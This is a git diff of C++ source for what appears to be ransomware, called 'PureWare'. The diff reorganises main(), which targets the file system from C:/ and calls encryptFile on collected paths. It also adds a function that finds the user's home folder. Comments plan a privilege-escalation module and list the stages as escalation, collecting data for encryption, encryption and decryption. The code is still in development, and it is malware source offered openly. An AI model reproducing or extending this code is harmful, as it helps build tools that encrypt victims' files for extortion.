@@ -1,8 +1,85 @@
 ﻿#include "PureWare.hpp"
- 
+
 using path_t = std::filesystem::path;
 using namespace std;
 auto file_logger = spdlog::basic_logger_mt("file_logger", "logs/my_log.txt");
+
+void traverseDirectory(const path_t& path, std::vector<path_t>& pathToCript);
+void encryptFile(const std::filesystem::path& path, const std::string& key);
+void decryptFile(const path_t& filePath, const std::string& key);
+
+int main(int argc, char* argv[])
+{
+    setlocale(LC_ALL, "Russian");
+
+    FileModule FileClass;
+    FileClass.FindDirectory();
+
+
+    path_t pathFolder = "C:/";
+    vector<path_t> PathToCript;
+
+    file_logger->set_level(spdlog::level::info);
+    file_logger->info("start the Cript");
+
+    path_t startPath = "C:/";
+    std::vector<path_t> pathToCript;
+    //traverseDirectory(startPath, pathToCript);
+    /*try {
+        if (filesystem::exists(pathFolder) && filesystem::is_directory(pathFolder)) {
+            for (const auto& entry : filesystem::directory_iterator(pathFolder)) {
+                auto filePath = entry.path();
+                if (entry.is_directory()) {
+                    // Ignore certain directories
+                    if (filePath == "C:/Documents and Settings" || filePath == "C:/System Volume Information") continue;
+
+                    // Check if directory is empty
+                    if (filesystem::is_empty(filePath)) {
+                        std::cout << "Directory is empty" << std::endl;
+                    }
+                    else {
+                        PathToCript.emplace_back(filePath);
+                        std::cout << "Directory is not empty" << std::endl;
+                    }
+                }
+                else if (entry.is_regular_file()) {
+                    // If it's a file, add it to the vector
+                    PathToCript.emplace_back(filePath);
+                    std::cout << "File added: " << filePath << std::endl;
+                }
+            }
+        }
+    }
+    catch (const filesystem::filesystem_error& e) {
+        std::cerr << "Filesystem error: " << e.what() << std::endl;
+        file_logger->error("Eror is {}", e.what());
+        file_logger->error(GetLastError());
+    }
+    catch (const std::exception& e) {
+        std::cerr << "Standard exception: " << e.what() << std::endl;
+        file_logger->error("Eror is {}", e.what());
+        file_logger->error(GetLastError());
+    }
+    catch (...) {
+        file_logger->error("Unknown error occurred");
+        std::cerr << "Unknown error occurred" << std::endl;
+        file_logger->error(GetLastError());
+    }*/
+
+    path_t a = "C:/Users/zero/Desktop/1.txt";
+    encryptFile(a, "12");
+    file_logger->info("ok");
+    //decryptFile(a, "12");
+    /*string key{ 12 };
+    for (const auto& a : pathToCript) {
+        file_logger->info("path {}", a.string());
+        if (std::filesystem::is_regular_file(a)) {
+            encryptFile(a, key);
+        }
+    }*/
+
+    return 0;
+}
 
 void traverseDirectory(const path_t& path, std::vector<path_t>& pathToCript) {
     try {
@@ -34,7 +111,7 @@ void traverseDirectory(const path_t& path, std::vector<path_t>& pathToCript) {
         }
     }
     catch (const filesystem::filesystem_error& e) {
-        file_logger->error("Filesystem error : {}",e.what());
+        file_logger->error("Filesystem error : {}", e.what());
     }
     catch (const std::exception& e) {
         file_logger->error("Standard exception:  {}", e.what());
@@ -105,75 +182,20 @@ void decryptFile(const path_t& filePath, const std::string& key) {
     fileOut.close();
 }
 
-int main(int argc, char* argv[])
-{
-    setlocale(LC_ALL, "Russian");
-    path_t pathFolder = "C:/";
-    vector<path_t> PathToCript;
+// Public method that writes user's home directory to the private class variable "directory"
+void FileModule::FindDirectory() {
 
-    file_logger->set_level(spdlog::level::info);
-    file_logger->info("start the Cript");
+    std::string homeDir;
+    PWSTR directoryPath = nullptr;
 
-    path_t startPath = "C:/";
-    std::vector<path_t> pathToCript;
-    //traverseDirectory(startPath, pathToCript);
-    /*try {
-        if (filesystem::exists(pathFolder) && filesystem::is_directory(pathFolder)) {
-            for (const auto& entry : filesystem::directory_iterator(pathFolder)) {
-                auto filePath = entry.path();
-                if (entry.is_directory()) {
-                    // Ignore certain directories
-                    if (filePath == "C:/Documents and Settings" || filePath == "C:/System Volume Information") continue;
+    // Here we should run the PrivEsc class module and if it returns true, then start working from the 'C:\' i.e.
+    // and if it returns false, just take the user's home directory
 
-                    // Check if directory is empty
-                    if (filesystem::is_empty(filePath)) {
-                        std::cout << "Directory is empty" << std::endl;
-                    }
-                    else {
-                        PathToCript.emplace_back(filePath);
-                        std::cout << "Directory is not empty" << std::endl;
-                    }
-                }
-                else if (entry.is_regular_file()) {
-                    // If it's a file, add it to the vector
-                    PathToCript.emplace_back(filePath);
-                    std::cout << "File added: " << filePath << std::endl;
-                }
-            }
-        }
+    // works from Windows Vista and later, alternative for elders's - SHGetFolderPath
+    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Profile, 0, nullptr, &directoryPath))) {
+        directoryPath_ = directoryPath;
     }
-    catch (const filesystem::filesystem_error& e) {
-        std::cerr << "Filesystem error: " << e.what() << std::endl;
-        file_logger->error("Eror is {}", e.what());
-        file_logger->error(GetLastError());
-    }
-    catch (const std::exception& e) {
-        std::cerr << "Standard exception: " << e.what() << std::endl;
-        file_logger->error("Eror is {}", e.what());
-        file_logger->error(GetLastError());
-    }
-    catch (...) {
-        file_logger->error("Unknown error occurred");
-        std::cerr << "Unknown error occurred" << std::endl;
-        file_logger->error(GetLastError());
-    }*/
 
-    path_t a = "C:/Users/zero/Desktop/1.txt";
-    encryptFile(a, "12");
-    file_logger->info("ok");
-    //decryptFile(a, "12");
-    /*string key{ 12 };
-    for (const auto& a : pathToCript) {
-        file_logger->info("path {}", a.string());
-        if (std::filesystem::is_regular_file(a)) {
-            encryptFile(a, key);
-        }
-    }*/
+    CoTaskMemFree(directoryPath); // need to free because SHGetKnownFolderPath allocates address and stores path in it
 
-    // повышение до adm
-    // сбор данных для шифрования
-    // шифрование
-    // дешифрование 
-    return 0;
 }
-
